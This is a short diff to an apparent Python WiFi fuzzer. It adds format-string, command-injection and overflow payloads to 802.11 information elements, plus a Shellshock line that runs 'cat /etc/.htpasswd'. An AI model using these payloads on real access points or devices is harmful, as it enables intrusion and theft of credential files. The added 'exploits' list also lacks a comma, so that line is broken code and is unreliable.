@@ -23,9 +23,15 @@ targets = raw_input("SSID> ")
 
 def engine():
   for i in range(1,256):
+    
+
+    fmts   = ["%s"*i,"AAA%08$x","AAA%08%h","AAA%08$s","AAA%08$n","%s"*i,"AAA%080$u"]
+    rc      = ["set","'set",":set","|set","$set"]
+    io = [str(i)*i] 
     bonull = ["00"*i]
     bofull = ["FF"*i]
-    exploits = [bonull,bofull]
+    sshock = ["env x='() { :;}; echo vulnerable' bash -c cat /etc/.htpasswd"]
+    exploits = [fmts,rc,io bonull,bofull,sshock]
     for x in exploits[:]:
       tofuzz = [
         "Dot11Elt(ID="+str(x)+",info='00')", 
